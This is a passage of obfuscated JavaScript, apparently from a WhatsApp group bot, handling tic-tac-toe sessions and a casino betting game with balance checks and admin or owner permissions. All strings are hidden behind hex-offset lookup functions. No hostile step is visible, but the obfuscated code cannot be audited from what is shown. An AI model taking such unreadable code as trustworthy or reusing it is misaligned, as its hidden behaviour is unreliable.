_0x2fe230(_0x182df2,_0x521e66-0x49d,_0x18396e-0x14c,_0x182df2-0x13f,_0x29eb7e-0x94);}function _0x5e3ebc(_0x3ca218,_0x57a6f4,_0x12138c,_0x212caf,_0x51c653){return _0x480ff3(_0x3ca218-0x1e6,_0x57a6f4-0xcc,_0x12138c-0x4d,_0x12138c-0x5e2,_0x57a6f4);}const _0x47dd99={'jgZPT':function(_0xebccf8,_0x1e4fa9,_0x29a2a0){return _0xebccf8(_0x1e4fa9,_0x29a2a0);},'yMzhh':function(_0xa1c2e1,_0x1c1663,_0x33b0bb){return _0xa1c2e1(_0x1c1663,_0x33b0bb);}};function _0x1f1d43(_0x2648dc,_0x46dfc5,_0x28bde0,_0x2bb7f0,_0xe574b){return _0x28040b(_0x2bb7f0- -0x2a,_0x46dfc5-0x16c,_0x28bde0-0x3a,_0x2bb7f0-0xe4,_0x2648dc);}function _0x2dc001(_0x521578,_0x5446e0,_0x4a7811,_0x1cc838,_0x597ea8){return _0x2fe230(_0x521578,_0x5446e0-0x521,_0x4a7811-0x102,_0x1cc838-0x150,_0x597ea8-0x16f);}function _0x641aea(_0x172bcb,_0x5f3679,_0x1b15bf,_0x26a8f8,_0x18d683){return _0x2fe230(_0x1b15bf,_0x172bcb-0x16e,_0x1b15bf-0xaa,_0x26a8f8-0x4b,_0x18d683-0x4f);}if(_0x47dd99[_0x1f1d43(-0x2e6,-0x3d1,-0xe5,-0x218,-0x1b8)](isTicTacToe,from,tictactoe))conn[_0x1f1d43(-0x30,0x32c,0xc,0x134,-0x6b)+_0x5e3ebc(0x625,0x442,0x449,0x56b,0x268)+'e'](from,{'text':_0x1f1d43(-0x2a3,-0xc7,-0x1d5,-0x1c6,-0x35c)+_0x1f1d43(-0x1c5,-0x72,-0x94,-0x9c,-0x219)+_0x1f1d43(0xd7,0xbf,-0x19,-0x6f,-0xcf)+_0x5e3ebc(0x5a5,0x664,0x49d,0x61d,0x552)+_0x641aea(0x279,0x301,0x2dc,0x30a,0x378)+_0x1f1d43(0x194,0x5f,0x2d6,0x1cf,0x351)+_0x641aea(0x3a0,0x44b,0x26f,0x292,0x24e)+_0x641aea(0x3bc,0x2bd,0x35a,0x409,0x21a)+_0x641aea(0x322,0x2ba,0x252,0x157,0x3ec)+'\x20@'+mentioned[0x531*0x5+-0xb89*-0x3+-0x3c90][_0x5e3ebc(0x563,0x29a,0x43d,0x2cb,0x3da)]('@')[-0x32*0x50+0x10d*-0x1+0x10ad],'mentions':[mentioned[-0x4ab*0x1+0x251*-0xe+0x1*0x2519]]});var _0x4e94e6=_0x47dd99[_0x5e3ebc(0x466,0x611,0x4e0,0x36b,0x536)](getPosTic,from,tictactoe);tictactoe[_0x641aea(0xaf,0x1bc,0x1f4,-0x95,0x8f)+'e'](_0x4e94e6,0x3*0x7eb+0xc*0x207+-0x3014);},0x6a48+-0x2bb4+0x369c),'timeout':0xea60,'TicTacToe':[_0x9b1ba0(-0xa5,0x38,0x4d,-0x29e,0xf2),_0x480ff3(-0x15,0xa,0xb,-0x1a1,-0xfd),_0x480ff3(-0x332,-0x2b,0x87,-0x15a,-0x262),_0x480ff3(0x204,0x1ba,0x22e,0xf4,0x133),_0x480ff3(-0xd8,-0x3b,-0xf0,-0x17f,0x14),_0x2fe230(-0x1a8,-0xcc,-0x137,0x117,-0x291),_0x480ff3(-0x82,-0x49,-0x13f,0xac,0x68),_0x480ff3(-0x2ae,-0xf7,-0x67,-0x18b,-0xeb),_0x526c7c(0x4fe,0x470,0x357,0x5ea,0x32d)]}),gameAdd(sender,glimit);}else reply(_0x526c7c(0x52b,0x479,0x4da,0x3c5,0x2c0)+_0x480ff3(-0x147,-0x345,-0x18c,-0x1f4,-0x3e9)+_0x480ff3(-0x240,0x72,-0x165,-0x100,0x40)+'*'+prefix+(_0x28040b(-0x1ad,-0x2ac,-0x2e9,-0x10,-0x264)+_0x28040b(-0x70,-0x254,-0x1a,-0x15a,-0x4a)+_0x28040b(0x193,0x16c,0x137,0x259,0x148)));break;case prefix+(_0x28040b(-0x1b6,-0x14b,-0x35a,-0x227,-0x1df)+'t'):case prefix+(_0x526c7c(-0x94,0x134,-0x1f,0x250,-0xb8)+'c'):if(!isGroup)return reply(mess[_0x28040b(0x177,-0x74,0x276,0x129,0x30a)+_0x480ff3(-0x160,0x1e8,0x1ef,0x69,0x11a)]);if(!isTicTacToe(from,tictactoe))return reply(_0x480ff3(0x257,0x47,0x24a,0x12b,-0x3b)+_0x9b1ba0(-0x23b,-0x3b,-0x3b2,-0x2dc,-0x5b)+_0x2fe230(0x94,0xef,0x2bc,0xd,0x283)+_0x526c7c(0x529,0x472,0x320,0x2bf,0x4c5)+_0x28040b(-0x1ad,-0xae,-0x202,-0xfd,-0x316)+_0x28040b(-0xf0,-0x14b,0x2d,-0x94,-0x1c3)+_0x9b1ba0(-0x15c,-0x17b,-0x344,-0xbb,-0x95)+_0x526c7c(0x1ff,0x33b,0x416,0x413,0x299)+'i');var posi=getPosTic(from,tictactoe);if(tictactoe[posi][_0x526c7c(0x3e5,0x45a,0x513,0x50f,0x325)+_0x526c7c(0x585,0x48a,0x3d3,0x3ab,0x3b5)][_0x480ff3(-0x200,-0x32e,-0x2c9,-0x206,-0x250)+_0x9b1ba0(-0x188,-0x77,0xf,-0x110,-0xb6)](sender))tictactoe[_0x480ff3(-0x3cd,-0x37d,-0x2af,-0x1e3,-0x325)+'e'](posi,0x1189+0x1e2a*0x1+0xb9*-0x42),reply(_0x526c7c(0x4a6,0x373,0x422,0x4cf,0x524)+_0x28040b(0x3,-0x51,0x8e,-0xb,-0x1c5)+_0x2fe230(0xbc,0x3f,0x23c,-0xfa,0x22d)+_0x480ff3(0x123,0x15b,-0x169,0x10,0x4a)+_0x480ff3(0x89,-0x9a,0x1c6,-0x24,-0x2a)+_0x9b1ba0(0x12c,0x2a1,0x15,0x27f,0x4f)+_0x526c7c(0x2e9,0x36c,0x3ac,0x408,0x50f)+_0x480ff3(-0x169,-0xfd,0xe2,0x55,-0xa)+_0x526c7c(0x2ec,0x4c2,0x5b1,0x613,0x5d1));else{if(tictactoe[posi][_0x2fe230(-0x14d,-0x10d,-0x15e,0x98,-0x60)+_0x28040b(0x1a0,0x137,0x398,0x26d,0x2a1)][_0x28040b(-0x12e,-0xb6,-0xb,0xaa,-0x8)+_0x2fe230(0x108,-0xdb,0xdc,-0xd0,0x10a)](sender))tictactoe[_0x28040b(-0x10b,-0x142,0x23,-0xa1,-0x19)+'e'](posi,-0x754*-0x3+0x7*0x3b2+-0x2fd9),reply(_0x526c7c(0x317,0x373,0x212,0x532,0x48d)+_0x526c7c(0x39a,0x2ed,0x1ce,0x366,0x271)+_0x28040b(-0xd,-0x205,0x1a4,0x1ae,-0x163)+_0x526c7c(0x4b4,0x3d2,0x244,0x43e,0x20b)+_0x9b1ba0(0x53,0x1b8,0x7b,-0x67,-0x17c)+_0x480ff3(-0x4c,-0x104,0x1b4,0xb5,0x11f)+_0x526c7c(0x3fe,0x36c,0x210,0x392,0x330)+_0x9b1ba0(0xcc,-0xc5,0x9e,0x27e,-0x15)+_0x2fe230(0x3af,0x224,0x166,0x2fa,0x27e));else{if(isGroupAdmins)tictactoe[_0x526c7c(0x271,0x1df,0x1b6,0x3bd,0x331)+'e'](posi,0x2324+0x1d97+-0x679*0xa),reply(_0x9b1ba0(0x28,0x87,-0xe,0xc,-0x16d)+_0x480ff3(-0x163,-0xce,-0x22e,-0xd5,-0x3d)+_0x480ff3(0x3d,-0x4,0x9d,-0xe5,-0xff)+_0x526c7c(0x272,0x3d2,0x3df,0x4e1,0x27d)+_0x28040b(0xb4,-0x13a,-0x3e,0x28d,0x190)+_0x9b1ba0(0x12c,-0x89,-0x51,0x11d,-0x69)+_0x480ff3(0x10f,-0x1ea,0xfc,-0x56,0x25)+_0x9b1ba0(0xcc,0x2ab,-0x10f,0x254,0x106)+_0x9b1ba0(0x177,0x289,0x1e2,0x1df,0x5e));else isOwner?(tictactoe[_0x526c7c(0x324,0x1df,0x77,0x1be,0x129)+'e'](posi,0x600+-0x60b+0xc),reply(_0x28040b(0x89,0x1f3,0x4e,0x70,-0x5d)+_0x9b1ba0(-0x5e,0x1,0x150,0x157,0x190)+_0x526c7c(0x403,0x2dd,0x3b4,0x489,0x125)+_0x480ff3(0x105,-0xd1,-0x7c,0x10,0x212)+_0x2fe230(0x259,0x100,0x1a0,0x2a3,-0xb0)+_0x480ff3(0xf0,0x18b,0x13a,0xb5,0x113)+_0x480ff3(-0x157,0x14d,0x62,-0x56,-0x1ab)+_0x9b1ba0(0xcc,0x296,0x2b1,-0x4c,-0xb3)+_0x480ff3(0x12d,0xb0,0x20f,0x100,0x216))):reply(_0x2fe230(0x5c,0x10d,-0x63,0x1ee,0x69)+_0x480ff3(-0x1de,-0x37f,-0x2fe,-0x1b3,-0x2e5)+_0x9b1ba0(-0x12c,0x26,-0x1c6,-0x329,0x2c)+_0x9b1ba0(0xea,0x1a,0x15c,0x246,0x18f)+_0x28040b(-0x131,-0xfd,-0x2bd,-0x2fc,-0x13a)+_0x480ff3(-0x73,-0x2b5,-0x68,-0x22d,-0xa7)+_0x480ff3(0x1d2,-0x1d,0x2b0,0x12e,0x16)+_0x480ff3(0x1ba,0x63,-0x1c3,0x3c,-0xb)+_0x28040b(0x14f,0x291,0x2fc,0x1a1,-0x90)+_0x28040b(-0x1bd,-0x184,-0x1a5,-0x4,-0x13d)+_0x480ff3(-0x381,-0xac,-0x342,-0x1eb,-0x1ae)+_0x9b1ba0(-0x1b0,0x2f,-0x38e,-0x3ab,-0x2e6)+'n!');}}break;case prefix+(_0x9b1ba0(-0x10e,-0x25b,0xc2,0xd4,-0x1a1)+'o'):if(!isGroup)return reply(mess[_0x9b1ba0(0x116,0xe0,0x1e9,0xa1,0x18b)+_0x9b1ba0(0xe0,-0x75,0x68,0x6a,0x194)]);if(isGame(sender,isOwner,gcount,glimit))return reply(_0x480ff3(0xef,-0x29,-0x133,0x26,0xeb)+_0x526c7c(0x2,0x1f2,0x125,0x2a3,0x351)+_0x2fe230(0x2cd,0xea,0x30,0x191,0xe6)+_0x2fe230(0x11b,0x254,0x3bf,0x1b7,0x11c)+_0x526c7c(0x10a,0x2c7,0x452,0x190,0x343)+'is');if(args[_0x480ff3(-0x283,-0x2ad,0x106,-0xd1,0x10c)+'h']<0x1*-0x79b+0x2149+-0x19ac)return reply(_0x2fe230(0x25c,0x1db,0x1d,0x78,0x1a7)+_0x526c7c(0xbf,0x1ce,0x7c,0x314,0x1da)+_0x2fe230(0x1a6,0x24,0x1bf,-0x159,-0xaf)+'*'+command+(_0x28040b(0x1f0,0x179,0x1d5,0x29d,0x3cf)+_0x28040b(0x1dd,0x4a,0x8f,0x23e,0x314)+_0x9b1ba0(0xdb,-0xe4,-0xc2,0x1ca,-0x110)));if(mentionUser[_0x480ff3(-0x18e,0x6e,-0x1e7,-0xd1,0x9d)+'h']==0x6a6+-0x464*-0x3+-0x13d2)return reply(_0x2fe230(0x2b9,0x1bf,0x13a,-0x12,0x14d)+_0x2fe230(-0x67,0x9e,-0x6c,-0xa6,0x38)+_0x9b1ba0(0x61,-0x81,-0x175,-0x4d,0xbc)+_0x2fe230(-0x11b,-0x28,0x63,-0x1e8,-0x207)+_0x9b1ba0(-0x244,-0x326,-0x9d,-0x91,-0x36c)+_0x9b1ba0(0xbb,0x1c4,0x1a8,0x275,0xc6)+_0x28040b(-0x12f,-0xbc,-0xfb,-0x1e4,-0x104)+_0x28040b(-0x188,0x48,-0x37c,-0x36,-0x311));if(mentionUser[_0x526c7c(0x152,0x2f1,0x2ed,0x248,0x27c)+'h']>0x1324+-0xf73+-0x3af)return reply(_0x480ff3(-0x131,-0x236,-0x194,-0xdf,-0xb2)+_0x526c7c(0x11b,0x21f,0x1bf,0x1f3,0x312)+_0x526c7c(0x34e,0x263,0x184,0xac,0x24e)+_0x526c7c(0x38d,0x255,0x127,0x35e,0x56)+_0x9b1ba0(0x14c,0x2af,-0x95,0x8c,0x1b2));if(mentionUser[-0x5*-0x74e+-0x95*-0x1d+-0x3567]===sender)return reply(_0x28040b(0x167,0x29,0x160,0x1b0,0x109)+_0x480ff3(0x185,0x228,0x208,0xf3,-0x4d)+_0x9b1ba0(-0x11,0x18c,0x183,-0x5e,-0x85)+_0x2fe230(0x329,0x1ab,0x305,0x78,0x2a5)+_0x9b1ba0(-0x238,-0x9d,-0x46,-0x28a,-0xa6)+_0x526c7c(0x3ad,0x294,0x280,0x330,0xec)+'i');if(mentionUser[0xf8b+-0xb83+0x3*-0x158]===botNumber)return reply(_0x9b1ba0(0x1a2,0x303,0x1e2,0x23f,0x32f)+_0x480ff3(-0x26f,-0x38b,-0x68,-0x1a3,-0x10f)+_0x28040b(-0x164,-0x1ce,-0x31c,-0x2f3,0x2c)+_0x526c7c(0x233,0x3ff,0x21a,0x497,0x3d3)+_0x2fe230(0x23c,0x84,0x3e,0xaf,0xae)+_0x9b1ba0(0x57,-0x102,-0x199,-0x24,0x1d8));if(getCasino(from,casino)!==null)return reply(_0x28040b(-0x1f3,-0x172,-0x300,-0x270,-0xb0)+_0x526c7c(0x6d,0x105,0x2a7,0x229,-0x2b)+_0x2fe230(-0x2ef,-0x124,-0x1f3,-0x142,-0x112)+_0x526c7c(0x2c5,0x1a1,0x29f,0x1aa,0xfe)+_0x9b1ba0(-0xca,-0x104,-0x43,-0x16e,-0x34)+_0x480ff3(-0x3a6,-0x318,-0x342,-0x284,-0xb5)+_0x480ff3(-0x1e6,-0xde,-0x1fa,-0x140,-0x17a)+_0x28040b(0x8d,0xf5,0x1,-0xd1,-0x153)+_0x28040b(0x1ab,0x1e1,0xa4,0x338,0x3a3)+_0x9b1ba0(-0x249,-0xfb,-0x262,-0x1db,-0x242)+_0x526c7c(0x555,0x36b,0x357,0x246,0x363)+_0x28040b(0x36,0x1aa,0x21a,0x19d,0x58)+_0x28040b(-0x191,-0x121,0x14,-0x22b,-0x34b)+prefix+(_0x2fe230(0x1b6,0x13c,0xe0,0x1a8,-0x78)+_0x28040b(-0x1db,-0x368,-0x13e,0x18,-0x87)+_0x28040b(0x16f,0x1cb,0x31f,0x1fe,-0x5f)+_0x526c7c(0x67e,0x4cd,0x3cd,0x5b7,0x339)+_0x526c7c(0x3fc,0x205,0x346,0x11d,0x324)+_0x28040b(0x195,0x164,0x69,0x327,0x219)+'si'));if(args[_0x526c7c(0x1d2,0x2f1,0x22c,0x3b7,0x130)+'h']==-0x224d+0x2647+-0x3f8)return reply(_0x480ff3(0x5b,0x13a,0x12d,0x65,-0x138)+_0x9b1ba0(0xff,-0x1b,0x113,0x108,0xe3)+_0x9b1ba0(-0x1e4,-0x191,-0x1e9,-0x2a9,-0x5)+_0x480ff3(-0x216,-0x208,-0x26e,-0x122,0x69));if(isNaN(parseInt(args[-0xdd2*0x1+-0x1e4d+0x2c21])))return reply(_0x28040b(0x14c,0x59,0x229,-0x2b,0x27f)+_0x2fe230(0xd3,0x149,0xc4,0x14d,0x2fb)+_0x28040b(0x1b0,0x16b,0x2b0,0x266,0x87)+_0x9b1ba0(0x91,0x1c4,-0xb3,0x11b,0x37)+_0x2fe230(0xf5,0x199,0x396,0x2bd,-0x33)+'a!');args[-0x1f*-0xc7+-0x151*-0x2+-0x1ab9][_0x9b1ba0(-0xd6,-0x2c,-0x9f,-0x30,-0xc0)+'ce'](/[^\w\s\-]+/,'');var anu=getBalance(sender,balance),ani=getBalance(mentionUser[0x119d+0x3*0xa97+-0x3162],balance);if(anu<args[-0x14a*-0xc+0x3*0x687+-0x230b]||anu==_0x480ff3(-0x2bf,-0x6c,-0x2d0,-0x16b,-0x32c)+_0x9b1ba0(0x12,0xa9,-0x7c,0x1db,0xcb))return reply(_0x526c7c(0x36f,0x389,0x445,0x1f6,0x394)+_0x526c7c(0x2a2,0x498,0x522,0x571,0x65d)+_0x480ff3(0x140,0x1a0,-0x126,0x21,-0x167)+_0x9b1ba0(-0x64,-0x4a,0x116,0x4a,0x24)+_0x480ff3(-0x27d,-0x209,-0x3d7,-0x29d,-0x381)+_0x480ff3(-0xfa,-0x17f,0x1b6,0x6c,0x144)+_0x480ff3(-0x120,-0x141,0x1b,-0xbc,0x37)+_0x2fe230(-0x51,-0x10b,-0x246,-0x1b8,0x2d)+_0x28040b(-0xcf,-0x207,0xe9,-0x231,-0x226)+_0x526c7c(-0x20,0x106,0x1e6,0x1d8,-0x67)+_0x480ff3(-0xa,-0xa8,-0x1b0,-0x2e,-0x15b)+'k\x20'+prefix+(_0x9b1ba0(0x130,-0xc2,0x242,0xea,0x1df)+_0x480ff3(-0x20a,0x36,-0x38,-0x67,0x170)+_0x2fe230(-0xab,-0x17e,0x8,-0x242,-0x7a)+_0x480ff3(-0x27b,-0x2fd,-0xd3,-0x24b,-0x6e)+_0x2fe230(0x1ce,0x130,0x30b,0x149,0x129)+_0x9b1ba0(-0x237,-0x414,-0x10d,-0x1ff,-0x439)+_0x2fe230(-0x21a,-0x27,-0x156,0xf1,-0x21f)));if(ani<args[0x72+0xa*0x289+-0x19ca]||ani==_0x2fe230(0x12d,-0x47,0x2c,0x78,0x108)+_0x9b1ba0(0x12,-0x14f,0x20a,-0x16,-0x146))return reply(_0x28040b(0x9f,-0x45,-0x59,0x29,0x1e5)+_0x9b1ba0(0xd7,-0x21,0x110,0x25e,0xb7)+_0x480ff3(-0x142,-0x200,-0x3a2,-0x2aa,-0xef)+_0x480ff3(-0x29a,-0x9f,-0x183,-0x138,-0x300)+_0x480ff3(0x2c9,0x77,0x9a,0x129,0x284)+_0x28040b(0x1f,-0x178,-0xa0,0x1bf,-0xa7)+_0x9b1ba0(-0xcc,-0x42,-0x1f3,-0x207,-0x1)+_0x28040b(0x5a,0x21f,0x13,0x36,-0x18)+_0x9b1ba0(-0x1f3,-0x360,-0x28a,-0x356,0x1)+_0x9b1ba0(-0x29,-0xb0,-0xdb,-0x163,-0x17e)+_0x2fe230(-0x43,-0xb6,0x147,-0x20,-0x166)+_0x28040b(0x64,0x221,0x191,-0x48,0x211)+prefix+(_0x2fe230(0x188,0x1dd,0x2ec,0x4f,-0x11)+_0x9b1ba0(-0x127,0x6d,-0x1ff,-0x203,-0x133)+_0x9b1ba0(-0x4c,-0x5d,0x19c,-0x9f,-0x209)+_0x526c7c(0x23f,0x206,0x239,0x192,0x5)+_0x526c7c(0x244,0x132,0x1c7,0x11d,0x323)+_0x2fe230(-0x14b,-0x4c,-0x12e,-0x5c,-0x1b3)+_0x28040b(0x1a7,0x311,0x81,0xff,0x66)+_0x28040b(0x1f6,0x3c7,0x3eb,0x281,0x8e)+_0x9b1ba0(0x19f,0x11d,0x172,0x12a,0x21)));setCasino(from,sender[_0x2fe230(-0x137,-0x81,0x17c,-0x237,0x98)]('@')[-0x445*0x4+-0x25f*0xa+0x1c6*0x17],mentioned[-0xd8b+0x737+0xa*0xa2][_0x28040b(-0xcd,-0x100,0xb6,-0x1c8,-0x298)]('@')[0x1*0x1826+0x1*0x4c3+-0x1ce9],Number(args[-0x17*0x172+0x15cb+0x7*0x1a3]),casino),gameAdd(sender,glimit);var starGame=_0x480ff3(-0x1bb,0x3b,0xb0,0x2,-0x67)+_0x28040b(-0x130,-0x19b,-0x150,-0xe1,-0xfc)+_0x2fe230(0x3b,0x52,-0x153,0x16e,0x6a)+_0x9b1ba0(0x189,0x1d3,0x364,0x292,0xbd)+_0x9b1ba0(-0x161,-0xaa,0x1b,-0x31d,-0x29f)+_0x28040b(-0xb9,-0x54,0x1b,-0x172,-0x1f4)+sender[_0x526c7c(0x322,0x275,0x122,0x416,0x34e)+'ce'](_0x28040b(-0x10,-0x1cc,-0x66,0x189,-0x161)+_0x9b1ba0(-0x1b4,-0x2c9,-0x23c,-0x27d,-0x1e2)+_0x2fe230(-0x145,0x6a,-0x158,0x4a,0x6f),'')+(_0x28040b(-0xbd,-0x13a,-0x1da,-0xbb,0x8a)+_0x9b1ba0(0xbf,0x2ad,-0x3e,0x298,0x2bc)+'\x20')+args[-0x17fd*-0x1+0x1d60+-0x355c]+(_0x9b1ba0(0x1a9,0x241,0x398,0x67,0x2a5)+_0x9b1ba0(-0x8,0x154,0x13b,0x1e6,0xfe)+_0x526c7c(0x31b,0x179,0x17f,0xb2,0x165)+_0x9b1ba0(0x18,-0xeb,0xda,0x13d,-0x157)+'\x20')+parseInt(args[-0x1d9*-0x7+0x2*-0x9d7+0x6c1])+(_0x2fe230(0xf6,0xad,-0x123,0x195,0x85)+_0x2fe230(0x94,0x40,-0x41,-0x118,0x19c)+_0x28040b(-0xc8,-0x13d,-0x9,-0x3b,0xb0)+_0x480ff3(-0x417,-0xf2,-0x13f,-0x2a2,-0x1ad)+_0x480ff3(0x61,0x13a,0x190,-0x60,0x66)+_0x526c7c(0x3a6,0x4d9,0x4e9,0x5ce,0x64f)+_0x480ff3(-0x62,0x287,0x249,0x9c,0x192)+_0x480ff3(-0x106,-0xb0,0x21b,0x68,-0x9a)+_0x28040b(0x1de,0x336,0x356,0x2b8,0xba)+_0x526c7c(0x3b6,0x3c2,0x507,0x484,0x29d)+_0x480ff3(0x5,-0x316,-0x175,-0x121,0x7f)+_0x2fe230(-0x1fb,-0x60,-0x242,-0x2a,0x189)+_0x9b1ba0(-0x55,-0xee,0xd7,-0xc3,-0x223)+_0x28040b(-0x184,-0x24a,-0x367,-0x30c,-0xc4)+_0x28040b(-0x60,-0x160,-0x1f6,-0xc3,0xc4)+_0x480ff3(-0x70,0x170,-0x2b,-0x72,-0x180)+_0x9b1ba0(-0x6c,0x47,0x67,0xb9,0x181)+_0x28040b(-0x165,-0x9f,-0x88,-0x1ba,-0x1f2)+_0x480ff3(-0x9b,0x1d3,-0x12,0x6a,-0xe3)+_0x9b1ba0(-0xe,0x11d,-0x82,-0x3c,0x1a0)+_0x480ff3(-0x362,-0x19,-0x228,-0x1c6,-0x231)+_0x526c7c(0x485,0x3ef,0x599,0x4ca,0x4ab)+_0x9b1ba0(-0xf8,-0x1bf,-0x9f,-0x167,-0x191)+_0x2fe230(-0x1fd,-0xf,-0x1fb,-0x1bc,-0x16c)+_0x9b1ba0(-0x148,-0x134,0x2e,-0x95,-0x191)+_0x9b1ba0(0x9f,0x6d,0x128,0x59,0x1a3)+_0x28040b(0x116,0xde,0x2d0,0x24b,0x6a));const _0x39561e={};_0x39561e[_0x2fe230(0x20c,0x1ca,0x293,0x20c,-0x2a)+'d']=msg,conn[_0x480ff3(-0x141,0xbd,0x1af,0x86,0x10c)+_0x28040b(-0xc1,-0x84,-0x23,0xef,-0x46)+'e'](from,{'text':starGame,'mentions':[sender,args[0x7b*0x43+0x71*-0x41+-0xb3*0x5][_0x9b1ba0(-0xd6,-0x2cd,-0x2af,-0x20c,0x6c)+'ce']('@','')+(_0x480ff3(0x4,0xec,-0x167,-0xe8,-0x212)+_0x9b1ba0(-0x1b4,-0x359,-0x3f,-0x160,-0x2a)+_0x480ff3(0xd6,-0xa4,-0x2b,-0xba,-0x1e3))]},_0x39561e);break;case prefix+(_0x2fe230(0x27b,0x13c,0x19a,0x2ac,0xa8)+_0x9b1ba0(0x12b,0x2f1,0x2a,-0xac,0x2af)):if(isPlayCasino(from,casino)){var csn=sesiCasino(from,casino);if(csn['Z'][_0x526c7c(0x61,0x1bc,0x380,0x33d,0x2b6)+_0x480ff3(-0x20a,-0x339,-0x2ac,-0x1ff,-0x1f6)](sender))clearTimeout(csn[_0x9b1ba0(-0x1bd,-0x2b9,-0x86,-0x312,-0x335)+'ed']),deleteCasino(from,casino),reply(_0x9b1ba0(0x28,0x207,0x13e,-0x11e,0x16b)+_0x28040b(-0xf2,-0x191,-0xe3,-0x9c,-0x1c7)+_0x28040b(-0xd,-0x202,0x139,-0x12,-0xa)+_0x9b1ba0(-0xf5,-0x1da,-0x2bb,0xc5,-0x112)+_0x526c7c(0x3f9,0x4a4,0x2d6,0x360,0x695)+_0x480ff3(-0x1b2,-0x8c,-0x2d2,-0x1d9,-0x164));else{if(csn['Y'][_0x9b1ba0(-0x18f,-0x1c5,-0x347,-0x199,-0x7f)+_0x2fe230(-0x23f,-0xdb,-0x186,-0x27a,-0x12e)](sender))clearTimeout(csn[_0x2fe230(0x1b,-0x110,0x3b,-0xb,-0x294)+'ed']),deleteCasino(from,casino),reply(_0x480ff3(0x115,-0x15f,-0xf6,-0x4f,0x115)+_0x2fe230(-0x1ce,-0xa6,0x147,0x8e,-0x11c)+_0x480ff3(0x94,-0x1dd,-0x292,-0xe5,0x2b)+_0x480ff3(-0x2f5,-0x168,-0x36,-0x16c,-0xd8)+_0x526c7c(0x641,0x4a4,0x440,0x697,0x501)+_0x2fe230(-0xfc,-0xb5,-0x2a6,-0x122,-0x12));else{if(isGroupAdmins)clearTimeout(csn[_0x9b1ba0(-0x1bd,-0x1c6,0x2b,-0x176,-0x250)+'ed']),deleteCasino(from,casino),reply(_0x480ff3(-0x1b6,-0xee,0x1a5,-0x4f,-0x3f)+_0x526c7c(0x3c1,0x1f8,0x239,0x2e,0x25)+_0x2fe230(0x227,0x3f,-0x9d,0x144,-0x4f)+_0x526c7c(0x1f1,0x256,0x23b,0x127,0x3e7)+_0x480ff3(0x102,0x22b,-0xbb,0xe2,0x19f)+_0x28040b(-0x101,-0xe9,-0x2f,-0x4,-0x169));else isOwner?(clearTimeout(csn[_0x28040b(-0x15c,0x41,-0x2b1,-0x184,-0x12)+'ed']),deleteCasino(from,casino),reply(_0x526c7c(0x3c1,0x373,0x4c9,0x4f1,0x1f4)+_0x28040b(-0xf2,-0x2ec,-0x290,-0x244,-0x290)+_0x480ff3(-0xbe,-0x74,-0x277,-0xe5,0xfe)+_0x2fe230(-0x154,0x4e,0x1d1,0x29,-0xd9)+_0x526c7c(0x4f0,0x31c,0x350,0x3ad,0x37b)+_0x28040b(0x18c,0x2f4,0xcd,0x2b1,0x322))):reply(_0x526c7c(0x3ae,0x3ab,0x4ed,0x249,0x2b4)+_0x2fe230(0x74,-0x8f,-0x9f,0xda,0xa3)+_0x9b1ba0(-0x12c,-0x32d,-0x87,-0x262,-0x262)+_0x480ff3(-0xd1,0x80,0x28,0x73,0x18b)+_0x526c7c(0x1dc,0x1b9,0x75,0x181,0x21)+_0x480ff3(-0x33d,-0x3e1,-0x3ae,-0x22d,-0x3c)+_0x480ff3(-0xfa,0x45,-0x63,0xf7,0x6f)+_0x28040b(0xe6,-0xd6,0x5b,0x21f,0xdc)+_0x2fe230(0x94,0x20c,0x130,0x14f,0x2b8)+_0x480ff3(-0x363,-0x2bb,-0x3ef,-0x28b,-0x191)+_0x526c7c(0x3b1,0x292,0x161,0x3f2,0x289)+_0x9b1ba0(-0x54,0x52,-0x1f0,-0xd4,-0x39));}}}else reply(_0x480ff3(0x76,0x23f,0xb7,0x12b,0x23e)+_0x9b1ba0(-0x23b,-0x199,-0x38c,-0xe6,-0x71)+_0x480ff3(-0x41,-0x8d,0x9a,-0x35,-0x1ea)+_0x9b1ba0(0x75,0xd3,0x106,-0x50,-0xa1)+_0x480ff3(-0x239,-0x4d,0x93,-0x156,-0xf6)+_0x9b1ba0(0xd4,0x241,0x258,0xd0,0x29e)+'g');break;case prefix+_0x480ff3(-0x326,-0x17e,-0x321,-0x25a,-0x22f):if(isGame(sender,isOwner,gcount,glimit))return reply(_0x2fe230(0x180,0x14a,0x226,0x142,0x7e)+_0x9b1ba0(-0x159,0x45,-0xe6,-0x126,-0x2f7)+_0x28040b(0x9e,0x274,-0x39,0x23a,-0xef)+_0x2fe230(0x3bc,0x254,0xdb,0x1ef,0xad)+_0x28040b(-0x23,0x26,0x38,-0x113,0xc3)+'is');if(args[_0x28040b(0x7,0x11f,0x1f7,-0xc8,-0x25)+'h']<-0xa*0x1b7+0x1970+-0x848)return reply(_0x480ff3(-0x99,-0x164,0x70,0x65,-0x3c)+_0x28040b(-0x1,0x75,-0x1c0,-0x18a,0x187)+_0x526c7c(0x3fd,0x3b7,0x595,0x3ce,0x231)+_0x9b1ba0(-0x1f8,-0x1f7,-0x36c,-0x1e2,-0x24f)+_0x28040b(0x191,0x1df,0x135,0x1d6,0x2f)+_0x2fe230(-0x88,0xf7,0x4a,0x1f1,0x292)+_0x9b1ba0(-0x189,-0x1d7,-0x313,-0x16,-0x34c)+':\x20'+command+_0x480ff3(-0x3a0,-0x8f,-0x1ae,-0x26c,-0x12c));if(q<-0x17e2+-0x2352+-0x1*-0x3b39)return reply(_0x526c7c(0x4bf,0x2d5,0x2c7,0x415,0x4a1)+_0x2fe230(0x93,0x71,0x11d,-0x6c,0xed)+_0x9b1ba0(0x130,0xa6,-0x52,0x301,0xd1)+'ce');if(q>-0x7*-0x241+0x6d9+-0x12b8)return reply(_0x480ff3(-0x2e1,-0x454,-0x163,-0x261,-0x396)+_0x526c7c(-0x4f,0x184,0x18d,0x1c,-0x26)+_0x9b1ba0(-0x1ab,-0x324,-0x8e,-0x187,-0xe8)+_0x9b1ba0(-0x237,-0x11f,-0x40e,-0x3e8,-0x2a1)+'e');if(isNaN(q))return reply(_0x526c7c(0x3a2,0x436,0x3ec,0x26d,0x5d4)+_0x2fe230(-0x14c,-0x13,0x4e,-0x1fa,0x17f)+_0x480ff3(-0xf3,0x180,-0x19b,-0x55,-0x228)+_0x480ff3(-0x12c,-0xe0,-0x163,0x1a,0x1ae)+_0x28040b(0x1a6,-0x47,0xf7,0x394,0x36)+'a!');args[0xaeb+0x253f+-0x1*0x3029][_0x28040b(-0x75,0x4,-0x218,0x1,-0x5)+'ce'](/[^\w\s\-]+/,'');var anu=getBalance(sender,balance);if(anu<q||anu==_0x480ff3(-0x30b,0x71,0x64,-0x16b,-0x19c)+_0x2fe230(0x12b,0xbf,0x64,0x1a4,-0x101))return 